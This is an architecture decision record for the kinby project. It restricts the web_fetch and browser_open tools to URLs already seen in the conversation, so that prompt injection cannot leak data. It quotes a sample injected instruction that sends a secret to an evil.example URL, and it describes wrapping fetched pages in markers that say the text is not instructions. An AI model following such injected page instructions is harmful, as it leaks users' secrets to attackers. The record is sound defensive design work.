# Web reads ask only for a URL the model built

Ticket [#161](https://github.com/jorgesolerrr/kinby/issues/161) gives every instance web search and web fetch as **default tools**. A read tool runs without asking in every mode (ADR 0014), and a fetch that may open any URL can leak data: an injected page tells the model to open `https://evil.example/?d=<a secret>`, and it does. The research in [#920](https://github.com/jorgesolerrr/kinby/issues/920) found that Anthropic's own web fetch opens only URLs already present in the conversation. kinby takes that rule for `web_fetch` and `browser_open`.

## Decision

- **`web_fetch` and `browser_open` are allowed for a URL that already appeared in the thread**: a user message, the routine prompt, a search result, a fetched page or a browser snapshot. A URL the model built itself asks under the ordinary gate, in every mode but `full-access`.
- **Both refuse what no URL rule should allow.** Loopback, private and link-local addresses are refused, and the check runs again on every redirect. So is a URL that carries credentials.
- **Their output is marked untrusted.** Page text comes back wrapped in markers that say it is content from the web, not instructions.
- **`web_search` sends queries only to the backend the instance chose.** Brave is the default, and Tavily, Exa or SearXNG can sit behind the same tool. The key is a hub secret. Without one the tool is absent and the instance shows pending setup. There is no keyless fallback.
- **`web_fetch` runs in process** with httpx and trafilatura. It turns a page into Markdown under a character cap and runs no JavaScript. A page that needs JavaScript is the browser's job.

## Considered options

- **Fetch is always allowed.** Rejected. It leaks.
- **Fetch always asks.** Rejected. Search and read could not run unattended.
- **A domain allowlist per instance.** Deferred. It catches less than the URL rule for a single user, and the container is the hard wall.
- **Provider-native search and fetch.** Rejected. They work only with that provider's models, and kinby runs several.

## Consequences

- The gate needs the thread's seen URLs when it judges these two tools, which is a new input to its verdict.
- A link that a fetched page carries counts as seen, so an attacker's own page can still send the model to its URL. What the rule stops is the model composing a URL around data it holds.
